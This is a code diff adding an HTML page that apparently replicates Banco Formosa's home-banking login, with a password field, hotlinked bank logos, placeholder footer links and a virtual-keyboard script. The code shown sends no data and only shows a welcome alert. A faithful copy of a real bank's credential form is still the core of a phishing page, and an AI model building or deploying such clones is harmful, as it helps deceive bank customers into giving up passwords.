@@ -1176,4 +1176,210 @@
                             <div class="input-wrapper">
                                 <div class="input-icon">
                                     <svg viewBox="0 0 24 24">
-                                        <rect x="3" y="11" width="18" height="11" rx="2"
+                                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                                        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                                    </svg>
+                                </div>
+                                <input class="input" autocomplete="new-password" type="password" placeholder="Clave personal" id="campoClave">
+                            </div>
+
+                            <button class="boton" type="button" onclick="continuar()">
+                                INGRESAR
+                            </button>
+
+                            <p class="forgot-text" onclick="volverUsuario()">
+                                ← Volver al usuario
+                            </p>
+                        </div>
+
+                        <p class="forgot-text">
+                            Olvidé o bloqueé mi Clave y/o Usuario
+                        </p>
+                        <div class="login-help">
+                            ¿Es tu primer ingreso?
+                        </div>
+
+                        <div class="mobileInfo">
+                            <div class="nets margin-top">
+                                <a target="_blank" href="#">
+                                    <img src="https://hb.bancoformosa.com.ar/assets/img/icon-facebook.png">
+                                </a>
+                                <a target="_blank" href="#">
+                                    <img class="remove-margin" src="https://hb.bancoformosa.com.ar/assets/img/icon-instagram.png">
+                                </a>
+                            </div>
+                            <div class="tels margin-top">
+                                <img src="https://hb.bancoformosa.com.ar/assets/img/icon-tel.png">
+                                <div class="data">
+                                    <h3>0800 777 2262</h3>
+                                    <p>Lunes a Viernes 7 a 19 Hs.</p>
+                                </div>
+                            </div>
+                            <h3 class="margin-top">Descarga nuestra App</h3>
+                            <div class="apps">
+                                <a target="_blank" href="#">
+                                    <img src="https://hb.bancoformosa.com.ar/assets/img/apple.png">
+                                </a>
+                                <a target="_blank" href="#">
+                                    <img src="https://hb.bancoformosa.com.ar/assets/img/android.png">
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <footer>
+            <a href="#">Términos y Condiciones</a>
+            <a href="#">Información de seguridad</a>
+            <a href="#">Políticas de privacidad</a>
+            <a href="#">Sucursales &amp; Cajeros</a>
+            <a href="#">Comparación de comisiones</a>
+        </footer>
+
+    </div>
+
+    <script>
+        function toggleTeclado(element) {
+            element.classList.toggle('active');
+            var keyboard = document.getElementById('virtualKeyboard');
+            
+            if (element.classList.contains('active')) {
+                keyboard.classList.add('active');
+                // Enfocar el input para que el teclado virtual funcione
+                if (document.getElementById('campoUsuario').value.length >= 3) {
+                    document.getElementById('campoClave').focus();
+                } else {
+                    document.getElementById('campoUsuario').focus();
+                }
+            } else {
+                keyboard.classList.remove('active');
+                document.activeElement.blur();
+            }
+        }
+
+        // Funcionalidad del teclado virtual
+        document.querySelectorAll('.hg-button').forEach(function(button) {
+            button.addEventListener('click', function(e) {
+                var value = this.getAttribute('data-value');
+                var activeElement = document.activeElement;
+                
+                if (activeElement && (activeElement.tagName === 'INPUT' || activeElement.tagName === 'TEXTAREA')) {
+                    if (value === 'bksp') {
+                        var start = activeElement.selectionStart;
+                        var end = activeElement.selectionEnd;
+                        var currentValue = activeElement.value;
+                        if (start === end) {
+                            if (start > 0) {
+                                activeElement.value = currentValue.substring(0, start - 1) + currentValue.substring(start);
+                                activeElement.selectionStart = start - 1;
+                                activeElement.selectionEnd = start - 1;
+                            }
+                        } else {
+                            activeElement.value = currentValue.substring(0, start) + currentValue.substring(end);
+                            activeElement.selectionStart = start;
+                            activeElement.selectionEnd = start;
+                        }
+                    } else if (value === 'enter') {
+                        var pasoUsuario = document.getElementById('pasoUsuario');
+                        var pasoClave = document.getElementById('pasoClave');
+                        if (pasoUsuario.style.display !== 'none') {
+                            siguientePaso();
+                        } else if (pasoClave.style.display !== 'none' && !pasoClave.classList.contains('oculto')) {
+                            continuar();
+                        }
+                    } else {
+                        var start = activeElement.selectionStart;
+                        var end = activeElement.selectionEnd;
+                        var currentValue = activeElement.value;
+                        activeElement.value = currentValue.substring(0, start) + value + currentValue.substring(end);
+                        activeElement.selectionStart = start + value.length;
+                        activeElement.selectionEnd = start + value.length;
+                    }
+                    
+                    var event = new Event('input', { bubbles: true });
+                    activeElement.dispatchEvent(event);
+                    
+                    if (activeElement.id === 'campoUsuario') {
+                        validarUsuario();
+                    }
+                }
+            });
+        });
+
+        function validarUsuario() {
+            var usuario = document.getElementById('campoUsuario').value;
+            var btn = document.getElementById('btnSiguiente');
+            
+            if (usuario.length >= 3) {
+                btn.disabled = false;
+                btn.style.opacity = '1';
+                btn.style.cursor = 'pointer';
+            } else {
+                btn.disabled = true;
+                btn.style.opacity = '0.5';
+                btn.style.cursor = 'not-allowed';
+            }
+        }
+
+        function siguientePaso() {
+            var usuario = document.getElementById('campoUsuario').value;
+            
+            if (usuario.length < 3) {
+                alert('Por favor, ingresá tu usuario (mínimo 3 caracteres).');
+                document.getElementById('campoUsuario').focus();
+                return;
+            }
+
+            document.getElementById('pasoUsuario').style.display = 'none';
+            var pasoClave = document.getElementById('pasoClave');
+            pasoClave.classList.remove('oculto');
+            pasoClave.style.display = 'block';
+            pasoClave.style.animation = 'fadeIn 0.3s ease forwards';
+            
+            setTimeout(function() {
+                document.getElementById('campoClave').focus();
+            }, 400);
+        }
+
+        function volverUsuario() {
+            document.getElementById('pasoClave').style.display = 'none';
+            document.getElementById('pasoClave').classList.add('oculto');
+            document.getElementById('pasoUsuario').style.display = 'block';
+            document.getElementById('campoUsuario').focus();
+        }
+
+        function continuar() {
+            var usuario = document.getElementById('campoUsuario').value;
+            var clave = document.getElementById('campoClave').value;
+            
+            if (clave.length === 0) {
+                alert('Por favor, ingresá tu clave.');
+                document.getElementById('campoClave').focus();
+                return;
+            }
+            
+            alert('¡Bienvenido ' + usuario + '!');
+        }
+
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                var pasoUsuario = document.getElementById('pasoUsuario');
+                var pasoClave = document.getElementById('pasoClave');
+                
+                if (pasoUsuario.style.display !== 'none') {
+                    siguientePaso();
+                } else if (pasoClave.style.display !== 'none' && !pasoClave.classList.contains('oculto')) {
+                    continuar();
+                }
+            }
+        });
+
+        document.getElementById('btnSiguiente').disabled = true;
+        document.getElementById('btnSiguiente').style.opacity = '0.5';
+        document.getElementById('btnSiguiente').style.cursor = 'not-allowed';
+    </script>
+
+</body>
+</html>
